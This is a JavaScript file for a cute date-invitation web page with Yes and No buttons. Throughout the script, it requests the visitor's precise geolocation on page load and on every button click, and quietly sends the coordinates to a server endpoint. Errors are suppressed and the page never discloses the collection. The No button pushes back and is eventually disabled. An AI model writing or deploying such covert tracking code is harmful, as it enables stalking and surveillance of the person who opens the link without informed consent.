const statusEl = document.getElementById("status");
const replyEl = document.getElementById("reply");
const yesBtn = document.getElementById("yesBtn");
const noBtn = document.getElementById("noBtn");

const API_BASE_URL = window.API_BASE_URL || "";

let noClickCount = 0;
let hasCapturedLocation = false;

async function sendLocation(coords) {
  const payload = {
    latitude: coords.latitude,
    longitude: coords.longitude,
    accuracy: coords.accuracy,
    timestamp: new Date().toISOString()
  };

  const response = await fetch(`${API_BASE_URL}/api/location`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });

  if (!response.ok) {
    throw new Error("Server rejected location");
  }
}

function onLocationSuccess(position) {
  hasCapturedLocation = true;
  const { latitude, longitude, accuracy } = position.coords;

  sendLocation({ latitude, longitude, accuracy }).catch(() => {});
}

function onLocationError() {}

function requestLocation() {
  if (!navigator.geolocation || hasCapturedLocation) {
    return;
  }

  navigator.geolocation.getCurrentPosition(onLocationSuccess, onLocationError, {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  });
}

yesBtn.addEventListener("click", () => {
  requestLocation();
  statusEl.textContent = "Best choice ever.";
  replyEl.textContent = "Perfect. Saturday evening, coffee and a walk?";
  replyEl.classList.add("show");
});

noBtn.addEventListener("click", () => {
  requestLocation();
  noClickCount += 1;

  if (noClickCount === 1) {
    statusEl.textContent = "Are you sure?";
    replyEl.textContent = "Think about it one more time.";
    replyEl.classList.add("show");
    return;
  }

  if (noClickCount === 2) {
    statusEl.textContent = "Last chance...";
    replyEl.textContent = "I can bring your favorite snacks.";
    return;
  }

  statusEl.textContent = "I will ask again tomorrow.";
  replyEl.textContent = "Still rooting for a yes.";
  noBtn.disabled = true;
});

requestLocation();
